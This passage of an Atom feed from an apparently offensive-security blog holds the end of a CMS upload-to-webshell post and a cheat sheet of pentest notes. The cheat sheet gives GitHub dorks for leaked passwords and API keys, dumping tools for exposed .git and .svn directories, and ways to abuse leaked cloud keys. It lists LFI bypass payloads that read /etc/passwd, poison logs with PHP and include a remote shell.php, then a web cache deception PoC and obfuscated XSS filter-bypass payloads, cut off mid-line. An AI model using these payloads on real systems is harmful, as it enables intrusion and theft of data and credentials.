class="line"></span><br><span class="line">category_img</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;filedname&quot;</span><br><span class="line"></span><br><span class="line">form</span><br><span class="line">-----------------------------3153167925816</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">-----------------------------3153167925816--</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e2e1fc838b.jpg" alt="上传shell.jpg"></p><p><img src="https://i.loli.net/2019/03/05/5c7e27dfe21fd.jpg" alt="getshell.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;semcms download :&lt;a href=&quot;http://www.sem-cms.com/TradeCmsdown/php/SEMCMS_PHP_3.7.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.sem-cms.c
      
    
    </summary>
    
    
    
      <category term="sem-cms" scheme="http://Vorders.me/tags/sem-cms/"/>
    
      <category term="漏洞挖掘" scheme="http://Vorders.me/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>知识索引</title>
    <link href="http://vorders.me/2018/12/27/%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%95/"/>
    <id>http://vorders.me/2018/12/27/%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%95/</id>
    <published>2018-12-27T01:49:01.000Z</published>
    <updated>2020-05-11T02:32:56.873Z</updated>
    
    <content type="html"><![CDATA[<blockquote><hr><p>声明:此文章为平时学习积累的知识索引，会大量引用大佬们的东西</p><h2 id="并且会持续更新……"><a href="#并且会持续更新……" class="headerlink" title="并且会持续更新……"></a>并且会持续更新……</h2></blockquote><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><h2 id="备忘"><a href="#备忘" class="headerlink" title="备忘"></a>备忘</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#certutil</span><br><span class="line">certutil -hashfile xxxx md5</span><br><span class="line">#sqlmap</span><br><span class="line">--prefix &quot;&apos; &quot; --suffix &quot; and &apos;r&apos;=&apos;r&quot;</span><br></pre></td></tr></table></figure><h2 id="docker备忘"><a href="#docker备忘" class="headerlink" title="docker备忘"></a>docker备忘</h2><p>docker save和docker export的区别</p><p>总结一下docker save和docker export的区别：</p><ol><li>docker save保存的是镜像（image），docker export保存的是容器（container）；</li><li>docker load用来载入镜像包，docker import用来载入容器包，但两者都会恢复为镜像；</li><li>docker load不能对载入的镜像重命名，而docker import可以为镜像指定新名称。</li></ol><h2 id="密码学知识"><a href="#密码学知识" class="headerlink" title="密码学知识"></a>密码学知识</h2><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><blockquote><p>md5详解：<a href="https://github.com/corkami/pocs/blob/master/collisions/README.md" target="_blank" rel="noopener">https://github.com/corkami/pocs/blob/master/collisions/README.md</a></p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote><p><a href="https://4hou.win/wordpress/?p=31548" target="_blank" rel="noopener">https://4hou.win/wordpress/?p=31548</a></p></blockquote><h2 id="域名搜集"><a href="#域名搜集" class="headerlink" title="域名搜集"></a>域名搜集</h2><p>存在网站abc.com搜集下列网站信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　abc-inc.com</span><br><span class="line">*.corp.abc.com</span><br><span class="line">*.intra.abc.com</span><br><span class="line">abc-corp.com</span><br><span class="line">abc-ltd.com</span><br></pre></td></tr></table></figure></p><h2 id="archive-org"><a href="#archive-org" class="headerlink" title="archive.org"></a>archive.org</h2><p><code>http://web.archive.org/cdx/search/cdx?url=xxxxxxxxxxx.com/*&amp;output=json&amp;fl=original&amp;collapse=urlkey</code></p><p>或者使用脚本<br><a href="https://gist.github.com/mhmdiaa/adf6bff70142e5091792841d4b372050" target="_blank" rel="noopener">archives</a></p><h2 id="google-amp-amp-github-hack"><a href="#google-amp-amp-github-hack" class="headerlink" title="google  &amp;&amp; github hack"></a>google  &amp;&amp; github hack</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">site:Github.com smtp @qq.commit</span><br><span class="line">site:Github.com root password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"xxxx.cn"</span> API_key</span><br><span class="line"><span class="string">"xxxx.cn"</span> secret_key</span><br><span class="line"><span class="string">"xxxx.cn"</span> aws_key</span><br><span class="line"><span class="string">"xxxx.cn"</span> Password </span><br><span class="line"><span class="string">"xxxx.cn"</span> FTP</span><br><span class="line"><span class="string">"xxxx.cn"</span> login </span><br><span class="line"><span class="string">"xxxx.cn"</span> github_token</span><br></pre></td></tr></table></figure><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -sS -O -sV -iL ~/Desktop/url.txt -p 20,21,22,23,24,25,53,67,68,69,79,80,81,82,83,84,85,86,87,88,89,109,110,111,137,138,139,143,161,210,389,443,465,512,513,514,546,873,993,994,995,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1158,1352,1433,1434,1521,2049,2181,2222,2888,3306,3307,3308,3389,3690,3700,3888,4040,4100,4200,4443,4444,4445,4848,5000,5006,5432,5601,5632,5900,5901,5902,5903,5904,5905,6379,7001,7077,7180,7181,7182,8000,8480,8485,8888,9000,9080,9092,9300,9418,10000,10020,11211,18080,19888,50470,50475,60000,60010,60020,60030,9093,27017,27018,27019,50010,50011,50012,50013,50014,50015,50016,50017,50018,50019,50020,50021,50022,50023,50024,50025,50026,50027,50028,50029,50030,50031,50032,50033,50034,50035,50036,50037,50038,50039,50040,50041,50042,50043,50044,50045,50046,50047,50048,50049,50050,50051,50052,50053,50054,50055,50056,50057,50058,50059,50060,50061,50062,50063,50064,50065,50066,50067,50068,50069,50070,50071,50072,50073,50074,50075,50076,50077,50078,50079,50080,50081,50082,50083,50084,50085,50086,50087,50088,50089,50090,9094,9095,9096,9097,9098,9099,9100,9101,9102,9103,9104,9105,9106,9107,9108,9109,9110,9111,9112,9113,9114,9115,9116,9117,9118,9119,9120,9121,9122,9123,9124,9125,9126,9127,9128,9129,9130,9131,9132,9133,9134,9135,9136,9137,9138,9139,9140,9141,9142,9143,9144,9145,9146,9147,9148,9149,9150,9151,9152,9153,9154,9155,9156,9157,9158,9159,9160,9161,9162,9163,9164,9165,9166,9167,9168,9169,9170,9171,9172,9173,9174,9175,9176,9177,9178,9179,9180,9181,9182,9183,9184,9185,9186,9187,9188,9189,9190,9191,9192,9193,9194,9195,9196,9197,9198,9199,9200,9443,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8011,8012,8013,8014,8015,8016,8017,8018,8019,8020,8021,8022,8023,8024,8025,8026,8027,8028,8029,8030,8031,8032,8033,8034,8035,8036,8037,8038,8039,8040,8041,8042,8043,8044,8045,8046,8047,8048,8049,8050,8051,8052,8053,8054,8055,8056,8057,8058,8059,8060,8061,8062,8063,8064,8065,8066,8067,8068,8069,8070,8071,8072,8073,8074,8075,8076,8077,8078,8079,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8161,8443,10001 -v -T4 -Pn -oA ~/Desktop/result</code></p><p>add<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12001、12002、12003、8080、8090、3003</span><br><span class="line">11111、62818、54467</span><br><span class="line">49242</span><br></pre></td></tr></table></figure></p><h3 id="TCP-SYN-SCAN"><a href="#TCP-SYN-SCAN" class="headerlink" title="TCP SYN SCAN"></a>TCP SYN SCAN</h3><blockquote><p><a href="https://xz.aliyun.com/t/5376" target="_blank" rel="noopener">https://xz.aliyun.com/t/5376</a></p></blockquote><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><h3 id="CDN绕过查找真实ip"><a href="#CDN绕过查找真实ip" class="headerlink" title="CDN绕过查找真实ip"></a>CDN绕过查找真实ip</h3><p><a href="https://vorders.me/2018/11/15/%E7%BB%95%E8%BF%87%E4%BA%91waf%E6%89%BE%E7%9C%9F%E5%AE%9Eip/">https://vorders.me/2018/11/15/%E7%BB%95%E8%BF%87%E4%BA%91waf%E6%89%BE%E7%9C%9F%E5%AE%9Eip/</a></p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><ul><li><strong>SHA-1</strong>:hash大小为160位，计算长度为40位</li><li>确定.git泄露存在与否，确认接收到请求是否为<strong>403</strong>（若为则存在）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">object对象</span><br><span class="line"> ├──blob              #二进制块，存放数据。结构:blob [文件大小]\x00[文件内容]</span><br><span class="line"> ├──tree              #存放层级关系。功能像文件夹，来管理文件和文件夹 # 例子:100644 blob 63c918c667fa005ff12ad89437f2fdc80926e21c    .gitignore</span><br><span class="line"> │  ├──mode           #文件模式  100644表普通文件，100755表可执行文件，具体参考unix的文件模式</span><br><span class="line"> │  ├──type           #对象类型 </span><br><span class="line"> │  ├──object         #指向文件的sha1签名</span><br><span class="line"> │  └──file           #文件名</span><br><span class="line"> ├──commit            #指向一个tree，包含描述信息</span><br><span class="line"> │  ├──tree           #tree的sha1签名</span><br><span class="line"> │  ├──parent         #上一步操作的历史记录（若没有则称之为root commit）</span><br><span class="line"> │  ├──author         #创建人,包含提交日期</span><br><span class="line"> │  └──committer      #注释,描述修改</span><br><span class="line"> └──tag               #标记commit,相当于版本号</span><br><span class="line">    ├──object         #commit的sha1签名</span><br><span class="line">    ├──type           #对象类型 </span><br><span class="line">    ├──tag            #标签名</span><br><span class="line">    ├──tagger         #标签创建人的名字</span><br><span class="line">    └──signature      #签名信息，可略</span><br></pre></td></tr></table></figure><ul><li><strong>Id（sha1编码过）的前2个字母是目录名，后38个字母是文件名。</strong></li></ul><p>对于sha1:<code>d16ecb17678b0297516962e2232080200ce7f2b3</code>存在以下目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xdsec-cms-12023458.xdctf.win/.git/objects/d1/6ecb17678b0297516962e2232080200ce7f2b3</span><br></pre></td></tr></table></figure></p><blockquote><p>详细内容查看：<a href="http://gitbook.liuhui998.com/1_2.html" target="_blank" rel="noopener">http://gitbook.liuhui998.com/1_2.html</a><br>文件模式查看：<a href="https://stackoverflow.com/questions/737673/how-to-read-the-mode-field-of-git-ls-trees-output" target="_blank" rel="noopener">https://stackoverflow.com/questions/737673/how-to-read-the-mode-field-of-git-ls-trees-output</a><br>P牛对于git泄露的详解：<a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html</a></p></blockquote><h3 id="svn-泄露"><a href="#svn-泄露" class="headerlink" title="svn 泄露"></a>svn 泄露</h3><p>工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/admintony/svnExploit.git</span><br><span class="line">python .\SvnExploit.py -u http://xx.xx.xx.xx/.svn --dump</span><br></pre></td></tr></table></figure></p><h3 id="BAZAAR-泄露"><a href="#BAZAAR-泄露" class="headerlink" title="BAZAAR 泄露"></a>BAZAAR 泄露</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SeahunOh/bzr_dumper</span><br><span class="line">python3 dumper.py -u &quot;http://127.1/&quot; -o source</span><br></pre></td></tr></table></figure><h3 id="api-key-泄露"><a href="#api-key-泄露" class="headerlink" title="api key 泄露"></a>api key 泄露</h3><p><a href="https://github.com/streaak/keyhacks" target="_blank" rel="noopener">api调用大全</a></p><p>阿里oss<br>地址：<a href="http://xxxxx.aliyuncs.com/" target="_blank" rel="noopener">http://xxxxx.aliyuncs.com/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">accessKeyId: &apos;xxx&apos;,</span><br><span class="line">accessKeySecret: &apos;xxx&apos;,</span><br><span class="line">bucket: &apos;xxx&apos;,</span><br><span class="line">host: &apos;xxx&apos;</span><br></pre></td></tr></table></figure></p><p>使用ossbrowser进行连接</p><p>获取思路：</p><ul><li>公开的托管代码库中存放AccessKey（源码泄漏问题）</li><li>APK文件中的配置文件存放AccessKey（反编译后可搜索）</li><li>WEB应用中的配置文件存放AccessKey（低权限webshell可访问）</li></ul><p>利用思路：</p><ul><li>第三方WEB管理平台</li><li>本地管理工具（如ossbrowser、ossutil）</li><li>编程调用官方提供的API</li></ul><blockquote><p>参考：<a href="https://www.cnblogs.com/xiaozi/p/11767841.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/11767841.html</a></p></blockquote><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>cms 漏洞挖掘<br>php 审计入门：<a href="https://xz.aliyun.com/u/10394" target="_blank" rel="noopener">https://xz.aliyun.com/u/10394</a></p><h3 id="验证码漏洞"><a href="#验证码漏洞" class="headerlink" title="验证码漏洞"></a>验证码漏洞</h3><blockquote><p><a href="https://xz.aliyun.com/t/4984#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4984#toc-3</a></p></blockquote><ul><li>验证码字符可控</li><li>验证码使用后未销毁</li><li>验证码存放位置暴露</li><li>验证码使用弱加密</li><li>验证码对比后未跳出/销毁</li><li>验证码尺寸可控导致ddos</li></ul><h3 id="文件包含-LFI-bypass"><a href="#文件包含-LFI-bypass" class="headerlink" title="文件包含(LFI) bypass"></a>文件包含(LFI) bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">./../</span><br><span class="line">..;/</span><br><span class="line">..././</span><br><span class="line">...\.\</span><br><span class="line">..\/</span><br><span class="line"></span><br><span class="line">http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini</span><br><span class="line"></span><br><span class="line">. = %252e</span><br><span class="line">/ = %252f</span><br><span class="line">\ = %255c</span><br><span class="line"></span><br><span class="line">%00   # php &lt; 5.3.4</span><br><span class="line"></span><br><span class="line">%252e%252e%252fetc%252fpasswd # 双编码</span><br><span class="line"></span><br><span class="line">%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd   # utf-8 编码</span><br><span class="line"></span><br><span class="line">../../#&#123;more ../&#125;../../etc/passwd      # 超大payload绕过，超过4096 byte</span><br><span class="line"></span><br><span class="line">....//....//etc/passwd                  #添加干扰字符</span><br><span class="line">..///////..////..//////etc/passwd</span><br><span class="line">/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</span><br><span class="line"></span><br><span class="line">http://example.com/index.php?page=\\10.0.0.1\share\shell.php   # 当php中 allow_url_include 和 allow_url_fopen为OFF的时候可以包含smb下文件</span><br><span class="line"></span><br><span class="line">php://filter/read=string.rot13/resource=index.php      # php伪协议</span><br><span class="line">input://            </span><br><span class="line">expect://id</span><br><span class="line">phar://</span><br><span class="line">data://</span><br><span class="line">zip://</span><br><span class="line"></span><br><span class="line">\\localhost\c$\windows\win.ini         # unc 绕过 </span><br><span class="line"></span><br><span class="line">GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1       # 包含/proc/self/environ ，日志文件达到rce</span><br><span class="line">User-Agent: &lt;?=phpinfo(); ?&gt;</span><br><span class="line">/var/log/apache/access.log</span><br></pre></td></tr></table></figure><blockquote><p>fuzz: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt</a></p></blockquote><p><a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">文件包含全知识详解</a></p><p>zip或phar协议包含文件</p><p>适用于上传文件被强制追加后缀<br>如：<br><code>a.php</code>-&gt;<code>a.php.jpg</code><br>此时存在文件包含漏洞<br>上传一个zip压缩包(php.zip)，里面文件为(a.php)<br>利用zip伪协议去包含文件<br><code>http://127.0.0.1/file.php?file=zip://php.zip.jpg%23a.php</code></p><blockquote><p><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="noopener">https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html</a></p></blockquote><p><strong>包含shell的临时文件如何寻找</strong></p><ol><li>phinfo 查看文件临时保存地址/文件名</li><li>window/linux通配符寻找</li></ol><p>在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>PHP反序列化标识符含义</p><p>a - array<br>b - boolean<br>d - double<br>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class<br>N - null<br>R - pointer reference<br>U - unicode string</p><p>private属性需要在字段两边+<code>%00</code><br>preg_replace()报错会返回NULL</p><p>常见魔术方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()//创建对象时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure></p><p>详细：</p><blockquote><p><a href="https://xz.aliyun.com/t/3674#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-0</a></p></blockquote><h3 id="php反射调用"><a href="#php反射调用" class="headerlink" title="php反射调用"></a>php反射调用</h3><blockquote><p><a href="https://www.cnblogs.com/youyoui/p/7300340.html" target="_blank" rel="noopener">https://www.cnblogs.com/youyoui/p/7300340.html</a></p></blockquote><h2 id="xpath-注入"><a href="#xpath-注入" class="headerlink" title="xpath 注入"></a>xpath 注入</h2><p>工具：<a href="https://github.com/orf/xcat" target="_blank" rel="noopener">xcat</a></p><h2 id="web缓存欺骗攻击"><a href="#web缓存欺骗攻击" class="headerlink" title="web缓存欺骗攻击"></a>web缓存欺骗攻击</h2><p>攻击三要素：</p><ul><li>访问<a href="http://127.1/a.php/b.css" target="_blank" rel="noopener">http://127.1/a.php/b.css</a> 时返回a.php内容</li><li>无cache头，</li><li>受害者已登录</li></ul><p>易存在漏洞的框架：</p><ul><li>PHP</li><li>Django</li><li>ASP.NET # FriendlyURLs关闭时</li><li>Cloudflare</li><li>IIS ARR</li><li>NGINX  #配置了缓存规则</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. attacker使用社工方式让victimer访问该页面： https://victim/messages/home/non-existent.css</span><br><span class="line">2. victimer访问页面后，根据自己的凭证获取到信息 ：https://victim/messages/home</span><br><span class="line">3. 并且缓存在该页面： https://victim/messages/home/non-existent.css</span><br><span class="line">4. 最后attacker访问该页面能获取到victimer信息 （https://victim/messages/home/non-existent.css）</span><br></pre></td></tr></table></figure><p>poc:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    var cachedUrl = 'https:/</span><span class="regexp">/www.【漏洞网站】.com/</span><span class="string">' + generateId() + '</span>.css<span class="string">';</span></span><br><span class="line"><span class="string">    const popup = window.open(cachedUrl);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function generateId() &#123;</span></span><br><span class="line"><span class="string">        var content = '</span><span class="string">';</span></span><br><span class="line"><span class="string">        const alphaWithNumber = '</span>QWERTZUIOPASDFGHJUKLYXCVBNM1234567890<span class="string">';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        for (var i = 0; i &lt; 10; i++) &#123;</span></span><br><span class="line"><span class="string">            content += alphaWithNumber.charAt(Math.floor(Math.random() * alphaWithNumber.length))</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return content;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    var checker = setInterval(function() &#123;</span></span><br><span class="line"><span class="string">        if (popup.closed) &#123;</span></span><br><span class="line"><span class="string">            clearInterval(checker);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;, 200);</span></span><br><span class="line"><span class="string">    var closer = setInterval(function() &#123;</span></span><br><span class="line"><span class="string">        popup.close();</span></span><br><span class="line"><span class="string">        document.body.innerHTML = '</span>Victims content is now cached &lt;a href=<span class="string">"' + cachedUrl + '"</span>&gt;here and the url can be saved on the hackers server&lt;<span class="regexp">/a&gt;&lt;br&gt;&lt;b&gt;Full Url: ' + cachedUrl + '&lt;/</span>b&gt;<span class="string">'; </span></span><br><span class="line"><span class="string">        clearInterval(closer);</span></span><br><span class="line"><span class="string">    &#125;, 3000);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p><a href="https://drive.google.com/file/d/0BxuNjp5J7XUIdkotUm5Jem5IZUk/view" target="_blank" rel="noopener">https://drive.google.com/file/d/0BxuNjp5J7XUIdkotUm5Jem5IZUk/view</a></p></blockquote><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">javas%<span class="number">0</span>acript:<span class="comment">//%250aalert(1)</span></span><br><span class="line">\j\av\a\s\cr\i\pt\:\a\l\ert\(<span class="number">1</span>\)</span><br><span class="line">OnAuxClick=alert<span class="string">``</span></span><br><span class="line">&lt;svgonload=alert(<span class="number">1</span>)<span class="comment">//</span></span><br><span class="line">-(confirm)(<span class="number">1</span>)<span class="comment">//</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Function</span><span class="string">`al\ert\`6\``</span>;</span><br><span class="line"></span><br><span class="line">setTimeout<span class="string">`\u0061lert\u0028document.domain\u0029`</span>;</span><br><span class="line">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1337</span></span><br><span class="line">self[<span class="built_in">Object</span>.keys(self)[<span class="number">5</span>]](<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">&lt;img src='1' onerror\x00=alert(0) /&gt;      # bypass onxxxx blacklist</span><br><span class="line">&lt;object onbeforescriptexecute=confirm(<span class="number">0</span>)&gt;</span><br><span class="line">&lt;img src=<span class="string">'1'</span> onerror/=alert(<span class="number">0</span>) /&gt;</span><br><span class="line"></span><br><span class="line">"&gt;&lt;svg/onload=confirm(1)&gt;"@x.y             # email xss</span><br><span class="line"></span><br><span class="line"><span class="string">""</span>[(!<span class="number">1</span>+<span class="string">""</span>)[<span class="number">3</span>]+(!<span class="number">0</span>+<span class="string">""</span>)[<span class="number">2</span>]+(<span class="string">''</span>+&#123;&#125;)[<span class="number">2</span>]][(<span class="string">''</span>+&#123;&#125;)[<span class="number">5</span>]+(<span class="string">''</span>+&#123;&#125;)[<span class="number">1</span>]+((<span class="string">""</span>[(!<span class="number">1</span>+<span class="string">""</span>)[<span class="number">3</span>]+(!<span class="number">0</span>+<span class="string">""</span>)[<span class="number">2</span>]+(<span class="string">''</span>+&#123;&#125;)[<span class="number">2</span>]])+<span class="string">""</span>)[<span class="number">2</span>]+(!<span class="number">1</span>+<span class="string">''</span>)[<span class="number">3</span>]+(!<span class="number">0</span>+<span class="string">''</span>)[<span class="number">0</span>]+(!<span class="number">0</span>+<span class="string">''</span>)[<span class="number">1</span>]+(!<span class="number">0</span>+<span class="string">''</span>)[<span class="number">2</span>]+(<span class="string">''</span>+&#123;&#125;)[<span class="number">5</span>]+(!<span class="number">0</span>+<span class="string">''</span>)[<span class="number">0</span>]+(<span 